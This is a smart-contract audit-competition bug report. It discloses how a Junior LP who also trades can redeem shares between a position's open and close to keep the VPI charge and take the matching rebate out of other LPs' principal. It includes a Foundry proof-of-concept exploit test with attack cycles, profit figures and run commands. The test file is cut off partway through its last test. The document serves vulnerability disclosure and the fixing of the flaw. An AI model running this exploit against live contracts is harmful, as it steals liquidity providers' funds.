# \#97729 [SC-Critical] Open-time VPI is booked as LP revenue while the matching close rebate is never reserved, so a Junior LP who also trades redeems in between and takes the rebate out of the remaining LPs' principal

**Submitted on Nov 2nd 2026 at 21:47:51 UTC by @Mclovin for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97729
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief / Intro

A trader that increases skew pays a VPI charge at open. The engine sends it to `HousePool` as realized revenue, and the
next reconcile credits it to Junior principal. The same position can recover exactly that charge as a rebate when it
closes: the close-side clamp bounds lifetime VPI at zero, so a skew-reducing close refunds everything the position
paid. Nothing records that refundable amount as a pool liability: not the LP NAV, not `getFreeAssets`, not a reserve.

The charge is therefore credited to the LPs present at open and debited from the LPs present at close. A party that is
both a large Junior LP and a trader opens a max-skew position, redeems its Junior shares at the inflated NAV in the
next epoch settlement, then closes and collects the rebate. Its trading leg nets only the execution fees. Its LP leg
exits with its share of the charge. The other Junior LPs end below their starting principal. Every step is public
(production V3 `commitOrder`/`executeOrder`, the permissionless keeper route `OrderRouter.settleLpEpoch(bytes[])`),
the price never moves, the position is open for 60 seconds, and the cycle repeats every three hours (measured over
three consecutive cycles below).

## Vulnerability Details

1. **The charge becomes LP revenue at once.** On open, `CfdEngineSettlementSidecar.executeOpen` routes the trade cost
   (VPI + execution fee − protocol share) into the pool and books it as `Revenue / CashArrived`
   (CfdEngineSettlementSidecar.sol:423, :446-463). `HousePool.recordClaimantInflow` increments `accountedAssets`, with
   no pending bucket while LP principal exists (HousePool.sol:640-648). The next reconcile distributes it through
   `distributeRevenue`: Senior up to its high-water mark, the rest to Junior principal
   (HousePoolWaterfallAccountingLib.sol:140-159).
2. **The same amount is refundable to the same position.** On close, `CloseAccountingLib` clamps the close VPI so that
   `proportionalAccrual + vpiDelta ≥ 0` (CloseAccountingLib.sol:103-118). For a position that paid X and whose close
   reduces skew, the close VPI is exactly −X. The plan pays it from free pool cash (CfdEnginePlanLib.sol:973-978) and
   `_executeClose` transfers it out of the pool (CfdEngineSettlementSidecar.sol:561, :621-623).
3. **No liability is recorded in between.** The only VPI reserve covers the opposite sign, a trader who received a
   rebate and owes a clawback (`_negativeVpiReserveTarget`, CfdEnginePlanLib.sol:48-55). LP NAV and the withdrawal
   snapshot contain no VPI term (`HousePool.getFreeAssets`, HousePool.sol:1235; `TerminalNavBookV2` reads
   `vpiAccrued` through its interface and never uses it).
4. **LP redemption is priced on that NAV, without a fee.** `HousePool._settleLpEpoch` reconciles and then funds
   matured redemptions at the reconciled principal (HousePool.sol:824, `_fundRedemptionPhase` :944). The redemption
   fee is zero while the oracle is live (`_settlementFeeBps`, HousePool.sol:1147-1155).

The code comment on the clamp says it exists to stop LP sandwich extraction around VPI (CloseAccountingLib.sol:112-115).
It does make the trader's round trip VPI-neutral, and that neutrality is what lets the LP leg keep the charge for free.

**This is not the depth-manipulation issue.** SECURITY.md:1443 ("the lifetime clamp intentionally zeroes otherwise
extractable rebate-only round trips") and the public AI-scan item "Temporary pool-liquidity reduction can amplify a
skew-reducing close rebate" (scan, info) are about a close rebate made larger by shrinking pool depth before the close.
This report does not depend on depth. Open and close VPI at equal depth are exact mirrors in `CfdMath.calculateVPI`,
so the refund equals the charge with no manipulation at all, and the extraction is on the LP leg: a redemption priced
on a NAV that contains X. Test `test_Attack_DepthRestoredBeforeClose` shows it. An unrelated LP deposits the same
4,000,000 into the epoch where the attacker's redemption is funded, so depth is 8,002,000.000000 at the open and
8,003,222.104597 at the close. The close pays out 4,553.844708 (vs 4,554.729653 when depth fell) and the attacker still
gains **+2,159.302228** (vs +2,160.187173). The loss then lands on the LP who entered while X was in the NAV:
**−3,641.543813** on its 4,000,000 deposit. A commitment-time or time-weighted depth, the remedy the depth items
imply, leaves this attack intact; only recording the refundable X as a liability removes it.

**This is not the documented collection-time policy for carry.** ACCOUNTING_SPEC.md:731-740 accepts that "LP ownership
follows collection time" for carry, so an incoming LP can share carry accrued before it joined. Carry is a one-way
payment: timing changes how revenue is split between cohorts, and nobody's principal falls. The VPI charge is different
because the protocol makes it refundable to the same position. Once the paying LP cohort has left, the refund comes out
of the remaining LPs' principal. In the control run below (same trades, no LP exit) the honest Junior LP gains 239.79
USDG. In the attack it ends 3,400.48 USDG below its starting value, and the attacker turns a fee-only loss
(−1,483.74 USDG) into a profit (+2,160.19 USDG).

## Impact Details

Measured in the PoC below, production risk parameters (`script/DeployPerpsArbitrumSepolia.s.sol:434-446`, Senior
cap at `:78-79`: vpiFactor 0.01e18,
maxSkewRatio 0.4e18, maint/init 10/20 bps, carry 500 bps, execution fee 4 bps; Senior cap 40M / 80%), pool of
1M honest Junior + 3M honest Senior + 4M attacker Junior, mark fixed at 1.00 from start to end:

| | attack | control (same trades, attacker does not redeem) |
|---|---|---|
| VPI paid at open, credited to `accountedAssets` | 5,777.216002 | 5,777.216002 |
| attacker Junior exit (4,000,000 deposited) | 4,004,555.111405 | — |
| pool paid out at close (rebate net of close fee and carry) | 4,554.729653 | — |
| honest Junior LP value (vault `convertToAssets`) | 999,961.651605 → 996,561.168387 (**−3,400.483218**) | 999,961.651605 → 1,000,201.444631 (+239.793026) |
| attacker total USDG (wallets + clearinghouse + LP value) | 4,199,956.157883 → 4,202,116.345056 (**+2,160.187173**) | 4,199,956.157883 → 4,198,472.415736 (−1,483.742147) |

**Repeated, with one minute of price exposure, and realised by the victim** (tests
`test_Attack_ThreeCyclesMinimalExposure` / `test_Control_ThreeCyclesSameTradesNoLpExit`). Each cycle: the attacker files
its redemption request first, opens 60 s before the epoch boundary, settles the epoch at the boundary through the
public route, claims, closes, and re-deposits (activated at the next epoch through the same public route). The control
makes the same trades at the same times without the redemption and re-deposit.

| cycle | position open | attacker (attack) | honest Junior (attack) | attacker (control) | honest Junior (control) |
|---|---|---|---|---|---|
| 1 | 60 s | +2,144.367330 | −3,439.431140 | −1,548.270381 | +222.134185 |
| 2 | 60 s | +2,148.981689 | −3,444.243944 | −1,548.504494 | +222.175870 |
| 3 | 60 s | +2,153.377394 | −3,448.797351 | −1,548.696579 | +222.207922 |
| total | | **+6,446.726413** | **−10,332.472435** | −4,645.471454 | +666.517977 |

Afterwards the honest Junior LP redeems 10% of its shares (100,066,711,073,938 shares) through the normal flow and
receives **98,961.833848 USDG** after the attack versus **100,061.721087 USDG** in the control: 1,099.887239 USDG less
for that 10%, in hand. The three attack cycles take 9 hours (one cycle per 3 hours: re-deposit activation, 1 h
cooldown, redemption epoch). The control timeline is 3 hours longer, which only adds Senior-coupon drift against the
honest LP, so the comparison is conservative.

- **Victims:** every Junior LP that holds shares at the close without having received the charge: LPs who stay
  (main tests) and LPs who deposit while X is in the NAV (depth-held test). The loss is principal, not foregone yield:
  in the control run the honest LP's entire revenue is +239.79, while the attack takes −3,400.48 from the same shares,
  and it is realised in USDG at redemption (98,961.83 vs 100,061.72 for the same 10% of shares).
- **Who can do it:** any address that can hold Junior shares and trade. Junior deposits are uncapped, so the attacker
  chooses its share of Junior. No keeper, owner or guardian role is used: the attacker executes its own orders and
  settles the LP epoch itself through the public keeper route.
- **Size:** the charge is ≈ 19 bps of the position's notional at a max-skew open (5,777.22 on 3,040,700), and the
  round trip costs 2 × 4 bps in execution fees, so the attack pays whenever the attacker holds more than ≈ 0.42 of
  Junior, with profit growing linearly above that. It repeats for as long as other Junior principal remains; the
  measured cycles show a steady ≈ 0.34% of the honest Junior LP's principal per cycle. The 0.42 threshold depends
  only on the execution fee (2 × 4 bps) and the VPI curve at the skew cap, not on pool size, and the trader and LP legs
  may be held by cooperating addresses.

## Recommendation

Treat a live position's positive `vpiAccrued` as a contingent pool liability until the position closes: exclude it from
distributable revenue (or hold it in a pending claimant bucket released at close) and from `getFreeAssets`. Any form
works as long as the LP cohort that receives the charge is the cohort that pays the rebate.

## Classification
- Class: accounting timing mismatch between revenue booked at open and a refund liability that is never recorded.
- Who can exploit: any address that can hold Junior shares and trade; no privileged role.
- Absent preconditions: no price movement, no oracle manipulation, no admin action, no victim action.


## Proof of Concept

## Proof of Concept

Steps (the test below does all of them, with a positive control):
1. Setup at deploy-time values: honest Junior 1,000,000 USDG and honest Senior 3,000,000 USDG; attacker Junior
   4,000,000 USDG through the public `requestDeposit` flow; all lots age past the 1 h cooldown.
2. Attacker trader commits a LONG of 3,040,700 tokens (≈ 0.38 × pool depth, under the 0.4 skew cap) with
   `OrderRouter.commitOrder(OrderRequest)` and explicit bounds, and executes it with `OrderRouter.executeOrder`.
   5,777.216002 USDG of VPI enters the pool as revenue.
3. Attacker LP calls `TrancheVault.requestRedeem` for all its Junior shares. At the epoch start the attacker calls
   `OrderRouter.settleLpEpoch(bytes[])` with a basket published at the boundary. The request is fully funded:
   4,004,555.111405 USDG.
4. Attacker trader commits and executes a full close at the same mark. The close rebate clamps to exactly the 5,777.22
   paid, and the pool pays out 4,554.729653 net of the close execution fee and carry.
5. Attacker withdraws its clearinghouse balance. Compare attacker USDG and the honest Junior LP's value against the
   control test (identical trades, no step 3).
6. `test_Attack_ThreeCyclesMinimalExposure` repeats steps 2-4 three times with the redemption request filed first, the
   open 60 s before the boundary and a re-deposit after each close, then has the honest LP redeem 10% of its shares;
   `test_Control_ThreeCyclesSameTradesNoLpExit` makes the same trades without the attacker's redemptions.
7. `test_Attack_DepthRestoredBeforeClose` repeats steps 2-4 while an unrelated LP deposits 4,000,000 into the same
   epoch, so pool depth at the close equals depth at the open.

Setup note: the test inherits the vendor's `BasePerpTest`, whose LP-funding helper installs the initial 1.00 mark
through the router before any trading exists (as every vendor test does). After `setUp` no privileged address is
used: every `vm.prank` in the test is the attacker's trader wallet, the attacker's LP wallet, the honest LP or the
unrelated LP. The only other post-`setUp` writes are to `MockPyth` storage (`setAllPrices`, and the vendor helper
`_mockPythUpdateData`), which stand in for the signed Pyth payload the caller attaches; the price written is always
the unchanged 1.00 mark, so nothing is created that the attacker could not obtain from Pyth. USDG is minted to the
unrelated LP for its deposit, as the harness mints for every account.

Run (Foundry, repo at the commit above):
```
git clone https://github.com/immunefi-team/audit-comp-plether && cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8 && git submodule update --init --recursive
mkdir -p packages/perps/test/fresh/lead   # save the file below as packages/perps/test/fresh/lead/LpVpiHarvestPublic.t.sol
cd packages/perps
FOUNDRY_TEST=test/fresh/lead forge test --dynamic-test-linking --match-path test/fresh/lead/LpVpiHarvestPublic.t.sol -vv
```
(`FOUNDRY_TEST` + `--dynamic-test-linking` only skip compiling the 293 vendor test files, which take hours under
via_ir. A plain `forge test --match-path …` from `packages/perps` gives the same result after the full build.)

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice H-LP-1: open-time VPI charge is booked as realized LP revenue immediately, while the symmetric
///         close-time rebate is an unrecorded liability. A party that is both a Junior LP and a trader opens a
///         skew-increasing position (pays VPI X into the pool), redeems its Junior shares at a NAV that contains X,
///         then closes (receives X back). Remaining LPs are left funding the rebate.
///         Production parameters (DeployPerpsArbitrumSepolia.s.sol, = live v2.0.0 engine riskParams): vpiFactor
///         0.01e18, maxSkew 0.4e18, maint/init 10/20 bps, carry 500 bps, execution fee 4 bps, senior cap 40M / 80%.
///         No privileged calls in the attack or control: orders use the production V3 commitOrder/executeOrder
///         surface with explicit bounds, and LP settlement uses the permissionless keeper route
///         router.settleLpEpoch(bytes[]), called by the attacker. Simplifications: MockPyth stands in for signed Pyth
///         data (the oracle still applies its PoolReconcile policy); USDG is mint-funded; the mark is held flat at
///         1.00 so the result carries no price exposure.
contract LpVpiHarvestPublicTest is BasePerpTest {

    address internal constant HONEST_JUNIOR = address(0x4A01);
    address internal constant HONEST_SENIOR = address(0x5A01);
    address internal constant ATTACKER_LP = address(0xA77A);
    address internal constant ATTACKER_TRADER = address(0xA77B);

    uint256 internal constant HONEST_JUNIOR_ASSETS = 1_000_000e6;
    uint256 internal constant HONEST_SENIOR_ASSETS = 3_000_000e6;
    uint256 internal constant ATTACKER_LP_ASSETS = 4_000_000e6;
    uint256 internal constant ATTACKER_TRADER_CASH = 200_000e6;
    uint256 internal constant MARK = 1e8;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // DeployPerpsArbitrumSepolia.s.sol lines 434-446
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        // production senior capacity (release wrapper): 40M absolute, 80% share
        _setSeniorCapacity(40_000_000e6, 8000);

        _fundJunior(HONEST_JUNIOR, HONEST_JUNIOR_ASSETS);
        _fundSenior(HONEST_SENIOR, HONEST_SENIOR_ASSETS);
        _fundJunior(ATTACKER_LP, ATTACKER_LP_ASSETS);
        // let every lot age past the 1h cooldown
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        _fundTrader(ATTACKER_TRADER, ATTACKER_TRADER_CASH);
        vm.deal(ATTACKER_TRADER, 1 ether);
        vm.deal(ATTACKER_LP, 1 ether);
    }

    // ------------------------------------------------------------------
    // helpers
    // ------------------------------------------------------------------

    function _bounds(
        uint256 maxNotional,
        uint256 maxDebit,
        uint256 maxActionCharge,
        uint256 maxPostSize
    ) internal view returns (OrderV3Types.ExecutionBounds memory b) {
        uint256 window = router.maxExecutionWindowSeconds();
        if (window > 300) {
            window = 300;
        }
        b = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 1, // Live only (CfdOrderPolicyEvaluatorBase: Live=1, Fad=2, Frozen=4)
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: 10_000e6,
            maxExecutionNotionalAssets: maxNotional,
            maxGrossAccountDebitAssets: maxDebit,
            maxActionChargeAssets: maxActionCharge,
            maxExplicitFeesAssets: 10_000e6,
            maxPostPositionSize: maxPostSize,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: 2_000_000
        });
    }

    function _commitAndExecute(
        OrderV3Types.OrderRequest memory request
    ) internal returns (uint64 orderId) {
        vm.prank(ATTACKER_TRADER);
        orderId = router.commitOrder(request);
        bytes[] memory data = _mockPythUpdateData(MARK);
        vm.prank(ATTACKER_TRADER); // keeper role is permissionless; attacker self-executes
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _openMaxSkew() internal returns (uint256 size, int256 vpiPaid, uint256 poolCashBefore) {
        uint256 depth = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        // notional (6 dec) = size(18) * price(8) / 1e20 ; use 95% of the 40% skew cap, rounded to 100-token lots
        uint256 notional = (depth * 38) / 100;
        size = ((notional * 1e20 / MARK) / 100e18) * 100e18;
        notional = size * MARK / 1e20;
        poolCashBefore = pool.accountedAssets();

        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256("lp-open"),
            side: CfdTypes.Side.LONG,
            sizeDelta: size,
            marginDelta: 100_000e6, // ~3.3% of notional: comfortably above the 20 bps initial margin
            targetPrice: MARK - MARK / 100, // OrderValidationLib.checkSlippage: open LONG needs execution >= target
            isClose: false,
            bounds: _bounds(notional + notional / 100, 150_000e6, 20_000e6, size)
        });
        _commitAndExecute(request);
        (,,,,,, vpiPaid) = engine.positions(ATTACKER_TRADER);
    }

    function _closeAll(
        uint256 size
    ) internal {
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256("lp-close"),
            side: CfdTypes.Side.LONG,
            sizeDelta: size,
            marginDelta: 0,
            targetPrice: MARK + MARK / 100, // OrderValidationLib.checkSlippage: close LONG needs execution <= target
            isClose: true,
            bounds: _bounds(type(uint256).max, type(uint256).max, type(uint256).max, 0)
        });
        _commitAndExecute(request);
    }

    // Settles a matured open-position epoch through the PUBLIC keeper route OrderRouter.settleLpEpoch(bytes[]), called by
    // the attacker itself at the epoch boundary with a basket whose components are all published at that boundary
    // (PoolReconcile policy). MockPyth storage is set to the same signed values, as Pyth's would be. Mark held at MARK.
    function _settleOpenPositionEpoch() internal {
        uint256 t = vm.getBlockTimestamp();
        bytes32[] memory ids = _basePythFeedIds();
        baseMockPyth.setAllPrices(ids, int64(uint64(MARK)), 0, int32(-8), t);
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(MARK)), 0, -8, t, 0));
        }
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encode(updates);
        vm.prank(ATTACKER_LP);
        router.settleLpEpoch{value: 0.01 ether}(data);
    }

    function _exitJuniorViaRouter(
        address lp
    ) internal returns (uint256 assets) {
        uint256 shares = juniorVault.maxRequestRedeem(lp);
        vm.prank(lp);
        uint256 requestId = juniorVault.requestRedeem(shares, lp, lp);
        vm.warp(pool.lpEpochStart(requestId));
        _settleOpenPositionEpoch();
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, lp);
        emit log_named_uint("attacker shares requested", shares);
        emit log_named_uint("attacker shares funded   ", claimable);
        vm.prank(lp);
        assets = juniorVault.claimRedeem(requestId, claimable, lp, lp);
    }

    function _honestJuniorNav() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(HONEST_JUNIOR));
    }

    function _attackerTotalCash() internal view returns (uint256) {
        return settlementToken.balanceOf(ATTACKER_LP) + settlementToken.balanceOf(ATTACKER_TRADER)
            + clearinghouse.balanceAssets(ATTACKER_TRADER);
    }

    // ------------------------------------------------------------------
    // positive control: the round trip without the LP exit costs the attacker and pays the LPs
    // ------------------------------------------------------------------

    function test_Control_RoundTripWithoutLpExitLosesFees() public {
        uint256 honestBefore = _honestJuniorNav();
        uint256 attackerBefore = _attackerTotalCash() + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER_LP));

        (uint256 size, int256 vpiPaid,) = _openMaxSkew();
        emit log_named_int("control: VPI charged at open (6dp)", vpiPaid);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _closeAll(size);

        uint256 honestAfter = _honestJuniorNav();
        uint256 attackerAfter = _attackerTotalCash() + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER_LP));
        emit log_named_uint("control: honest junior NAV before", honestBefore);
        emit log_named_uint("control: honest junior NAV after ", honestAfter);
        emit log_named_uint("control: attacker total before", attackerBefore);
        emit log_named_uint("control: attacker total after ", attackerAfter);
        // Junior pays the 8% senior coupon continuously (~55 USDG over the test's ~2h on 3M senior); allow that drift.
        if (honestAfter < honestBefore) {
            emit log_named_uint("control: honest junior drift (coupon only)", honestBefore - honestAfter);
            assertLt(honestBefore - honestAfter, 100e6, "control: honest LP loses nothing beyond coupon drift");
        }
        assertLt(attackerAfter + 1_000e6, attackerBefore, "control: attacker loses at least the execution fees");
    }

    // ------------------------------------------------------------------
    // attack: open (VPI into NAV) -> LP exit at inflated NAV -> close (rebate from remaining LPs)
    // ------------------------------------------------------------------

    function test_Attack_LpExitBetweenOpenAndCloseHarvestsVpi() public {
        uint256 honestBefore = _honestJuniorNav();
        uint256 attackerBefore = _attackerTotalCash() + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER_LP));
        uint256 markBefore = engine.lastMarkPrice();

        (uint256 size, int256 vpiPaid, uint256 poolCashBefore) = _openMaxSkew();
        emit log_named_uint("position size (18dp)", size);
        emit log_named_int("VPI charged at open (6dp)", vpiPaid);
        emit log_named_uint("pool accountedAssets delta at open", pool.accountedAssets() - poolCashBefore);

        uint256 exitAssets = _exitJuniorViaRouter(ATTACKER_LP);
        emit log_named_uint("attacker LP exit assets", exitAssets);

        uint256 poolBeforeClose = pool.accountedAssets();
        _closeAll(size);
        emit log_named_uint("pool accountedAssets paid out at close", poolBeforeClose - pool.accountedAssets());

        // withdraw the trader account back to the wallet so everything is plain USDG
        uint256 free = clearinghouse.getFreeBuyingPowerAssets(ATTACKER_TRADER);
        vm.prank(ATTACKER_TRADER);
        clearinghouse.withdraw(ATTACKER_TRADER, free);

        uint256 honestAfter = _honestJuniorNav();
        uint256 attackerAfter = _attackerTotalCash();
        emit log_named_uint("mark before/after", markBefore);
        assertEq(engine.lastMarkPrice(), markBefore, "price is back to (never left) the start");
        emit log_named_uint("honest junior NAV before", honestBefore);
        emit log_named_uint("honest junior NAV after ", honestAfter);
        emit log_named_uint("attacker total before", attackerBefore);
        emit log_named_uint("attacker total after ", attackerAfter);
        if (honestAfter < honestBefore) {
            emit log_named_uint("HONEST JUNIOR LOSS (6dp)", honestBefore - honestAfter);
        }
        if (attackerAfter > attackerBefore) {
            emit log_named_uint("ATTACKER PROFIT (6dp)", attackerAfter - attackerBefore);
        }
        assertGt(attackerAfter, attackerBefore + 500e6, "attacker must end with materially more USDG than it started with");
        assertLt(honestAfter + 500e6, honestBefore, "honest junior LP must have lost materially (beyond coupon drift)");
    }

    // ------------------------------------------------------------------
    // repeated cycles with minimal price exposure, and the honest loss realised in USDG
    // ------------------------------------------------------------------

    uint256 internal constant CYCLES = 3;

    function _openCycle(
        uint256 i
    ) internal returns (uint256 size) {
        uint256 depth = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        uint256 notional = (depth * 38) / 100;
        size = ((notional * 1e20 / MARK) / 100e18) * 100e18;
        notional = size * MARK / 1e20;
        _commitAndExecute(
            OrderV3Types.OrderRequest({
                clientOrderId: keccak256(abi.encode("cycle-open", i)),
                side: CfdTypes.Side.LONG,
                sizeDelta: size,
                marginDelta: 100_000e6,
                targetPrice: MARK - MARK / 100,
                isClose: false,
                bounds: _bounds(notional + notional / 100, 150_000e6, 20_000e6, size)
            })
        );
    }

    function _closeCycle(
        uint256 size,
        uint256 i
    ) internal {
        _commitAndExecute(
            OrderV3Types.OrderRequest({
                clientOrderId: keccak256(abi.encode("cycle-close", i)),
                side: CfdTypes.Side.LONG,
                sizeDelta: size,
                marginDelta: 0,
                targetPrice: MARK + MARK / 100,
                isClose: true,
                bounds: _bounds(type(uint256).max, type(uint256).max, type(uint256).max, 0)
            })
        );
    }

    /// Attacker LP re-deposits all its USDG; activation through the public settle route; claims the shares.
    function _redepositAll() internal {
        uint256 amount = settlementToken.balanceOf(ATTACKER_LP);
        vm.startPrank(ATTACKER_LP);
        settlementToken.approve(address(juniorVault), amount);
        uint256 requestId = juniorVault.requestDeposit(amount, ATTACKER_LP, ATTACKER_LP);
        vm.stopPrank();
        vm.warp(juniorVault.depositEpochStart(requestId));
        _settleOpenPositionEpoch();
        uint256 claimable = juniorVault.claimableDepositRequest(requestId, ATTACKER_LP);
        vm.prank(ATTACKER_LP);
        juniorVault.claimDeposit(requestId, claimable, ATTACKER_LP, ATTACKER_LP);
    }

    /// The honest Junior LP redeems 10% of its shares through the public flow and returns the USDG it receives.
    function _honestRealisedRedeem() internal returns (uint256 shares, uint256 usdg) {
        shares = juniorVault.balanceOf(HONEST_JUNIOR) / 10;
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        vm.prank(HONEST_JUNIOR);
        uint256 requestId = juniorVault.requestRedeem(shares, HONEST_JUNIOR, HONEST_JUNIOR);
        vm.warp(pool.lpEpochStart(requestId));
        _settleOpenPositionEpoch();
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, HONEST_JUNIOR);
        uint256 before = settlementToken.balanceOf(HONEST_JUNIOR);
        vm.prank(HONEST_JUNIOR);
        juniorVault.claimRedeem(requestId, claimable, HONEST_JUNIOR, HONEST_JUNIOR);
        usdg = settlementToken.balanceOf(HONEST_JUNIOR) - before;
    }

    /// One cycle. Attack: redeem request first, open 60 s before the epoch boundary, settle at the boundary through the
    /// public route, claim, close, re-deposit. Control: identical trades and times, but no redeem and no re-deposit.
    function _cycle(
        uint256 i,
        bool attack
    ) internal returns (uint256 openSeconds) {
        vm.warp(vm.getBlockTimestamp() + 1 hours); // past the 1h deposit cooldown
        uint256 requestId;
        uint256 boundary;
        if (attack) {
            uint256 shares = juniorVault.balanceOf(ATTACKER_LP);
            vm.prank(ATTACKER_LP);
            requestId = juniorVault.requestRedeem(shares, ATTACKER_LP, ATTACKER_LP);
            boundary = pool.lpEpochStart(requestId);
        } else {
            boundary = pool.lpEpochStart(pool.currentLpEpoch() + 2);
        }
        vm.warp(boundary - 60);
        uint256 size = _openCycle(i);
        uint256 openedAt = vm.getBlockTimestamp();
        vm.warp(boundary);
        if (attack) {
            _settleOpenPositionEpoch();
            uint256 claimable = juniorVault.claimableRedeemRequest(requestId, ATTACKER_LP);
            vm.prank(ATTACKER_LP);
            juniorVault.claimRedeem(requestId, claimable, ATTACKER_LP, ATTACKER_LP);
        }
        _closeCycle(size, i);
        openSeconds = vm.getBlockTimestamp() - openedAt;
        if (attack) {
            _redepositAll();
        } else {
            vm.warp(vm.getBlockTimestamp() + 1 hours); // mirror the attack's re-deposit epoch
        }
    }

    function _runCycles(
        bool attack
    ) internal {
        string memory tag = attack ? "ATTACK" : "CONTROL";
        uint256 honestBefore = _honestJuniorNav();
        uint256 attackerBefore = _attackerTotalCash() + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER_LP));
        uint256 startTime = vm.getBlockTimestamp();
        for (uint256 i = 1; i <= CYCLES; ++i) {
            uint256 attackerStart =
                _attackerTotalCash() + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER_LP));
            uint256 honestStart = _honestJuniorNav();
            uint256 openSeconds = _cycle(i, attack);
            uint256 attackerEnd = _attackerTotalCash() + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER_LP));
            uint256 honestEnd = _honestJuniorNav();
            emit log_named_uint(string.concat(tag, " cycle"), i);
            emit log_named_uint("  position open (seconds)", openSeconds);
            emit log_named_int("  attacker delta this cycle (6dp)", int256(attackerEnd) - int256(attackerStart));
            emit log_named_int("  honest junior delta this cycle (6dp)", int256(honestEnd) - int256(honestStart));
        }
        assertEq(engine.lastMarkPrice(), MARK, "mark never moved");
        uint256 attackerAfter = _attackerTotalCash() + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER_LP));
        uint256 honestAfter = _honestJuniorNav();
        emit log_named_uint(string.concat(tag, " elapsed seconds"), vm.getBlockTimestamp() - startTime);
        emit log_named_int(string.concat(tag, " attacker total delta (6dp)"), int256(attackerAfter) - int256(attackerBefore));
        emit log_named_int(string.concat(tag, " honest junior delta (6dp)"), int256(honestAfter) - int256(honestBefore));
        (uint256 shares, uint256 usdg) = _honestRealisedRedeem();
        emit log_named_uint(string.concat(tag, " honest redeems shares"), shares);
        emit log_named_uint(string.concat(tag, " honest receives USDG (6dp)"), usdg);
        if (attack) {
            assertGt(attackerAfter, attackerBefore + 3 * 500e6, "attacker profits every cycle");
            assertLt(honestAfter + 3 * 500e6, honestBefore, "honest junior loses every cycle");
        } else {
            assertLt(attackerAfter, attackerBefore, "control: attacker only pays fees");
        }
    }

    function test_Attack_ThreeCyclesMinimalExposure() public {
        _runCycles(true);
    }

    function test_Control_ThreeCyclesSameTradesNoLpExit() public {
        _runCycles(false);
    }

    // ------------------------------------------------------------------
    // depth held constant: the extraction does not come from shrinking pool depth before the close
    // ------------------------------------------------------------------

    address internal constant UNRELATED_LP = address(0x7111);

    /// An unrelated LP deposits the same 4M into the epoch in which the attacker's redemption is funded, so pool depth
    /// at the close is about the same as at the open. The close rebate is then the plain (unclamped) mirror of the
    /// open charge, and the attacker still profits by the same mechanism.
    function test_Attack_DepthRestoredBeforeClose() public {
        uint256 attackerBefore = _attackerTotalCash() + juniorVault.convertToAssets(juniorVault.balanceOf(ATTACKER_LP));
        uint256 honestBefore = _honestJuniorNav();
        uint256 depthAtOpen = pool.totalAssets() - engine.totalTraderClaimBalanceAssets();
        (uint256 size, int256 vpiPaid,) = _openMaxSkew();

        uint256 shares = juniorVault.maxRequestRedeem(ATTACKER_LP);
        vm.prank(ATTACKER_LP);
        uint256 redeemId = juniorVault.requestRedeem(shares, ATTACKER_LP, ATTACKER_LP);
        uint256 depositAmount = ATTACKER_LP_ASSETS;
        settlementToken.mint(UNRELATED_LP, depositAmount);
        vm.startPrank(UNRELATED_LP);
        settlementToken.approve(address(juniorVault), depositAmount);
        uint256 depositId = juniorVault.requestDeposit(depositAmount, UNRELATED_LP, UNRELATED_LP);
        vm.stopPrank();
        assertEq(pool.lpEpochStart(redeemId), juniorVault.depositEpochStart(depositId), "same epoch");

        vm.warp(pool.lpEpochStart(redeemId));
        _settleOpenPositionEpoch(); // funds the attacker's redemption, then activates the unrelated deposit
        uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, ATTACKER_LP);
        vm.prank(ATTACKER_LP);
        juniorVault.claimRedeem(redeemId, claimable, ATTACKER_LP, ATTACKER_LP);
